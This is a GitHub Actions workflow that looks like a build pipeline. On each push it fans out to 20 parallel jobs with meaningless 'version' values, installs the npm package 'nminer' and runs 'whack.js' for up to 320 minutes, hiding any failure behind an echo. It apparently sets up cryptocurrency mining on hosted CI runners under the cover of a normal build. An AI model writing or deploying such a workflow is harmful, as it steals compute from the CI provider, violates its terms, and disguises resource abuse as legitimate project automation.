name: whack
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2448 }
          - { version: 4561 }
          - { version: 3928 }
          - { version: 5890 }
          - { version: 7695 }
          - { version: 1441 }
          - { version: 7249 }
          - { version: 6939 }
          - { version: 1866 }
          - { version: 7786 }
          - { version: 5949 }
          - { version: 6577 }
          - { version: 4283 }
          - { version: 5322 }
          - { version: 6669 }
          - { version: 1974 }
          - { version: 4013 }
          - { version: 6172 }
          - { version: 5575 }
          - { version: 2997 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: implode
        run: |
          npm install nminer@latest
          timeout 320m node whack.js || echo "whack executed"